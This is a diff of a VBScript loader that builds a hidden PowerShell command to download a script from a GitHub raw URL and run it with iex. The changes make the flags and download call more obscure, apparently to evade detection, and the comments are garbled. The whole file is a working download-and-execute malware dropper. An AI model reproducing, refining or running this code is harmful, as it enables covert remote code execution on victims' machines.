@@ -1,13 +1,13 @@
 Set o = CreateObject("WScript.Shell") ' Initialize the WScript.Shell object
  
 ' Define tll command with oscated prameters
-sA = "powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command "
+sA = "powershell.exe -W 1 -Exec B -C "
  
 ' Define the RL of thript
 sB = "$u='https://github.com/smad1252/cvbv-ftjudy/raw/refs/heads/main/nur.ps1';"
  
 ' Defihe command to eecute the ript content
-sC = "iex(iwr $u -UseBasicParsing).Content"
+sC = "iex(i'w'r $u -UseB).COnteNt"
  
 ' Run themand with hidden winle and wiiting for it to finish
 o.Run sA & Chr(32) & sB & sC & Chr(32), 0, False
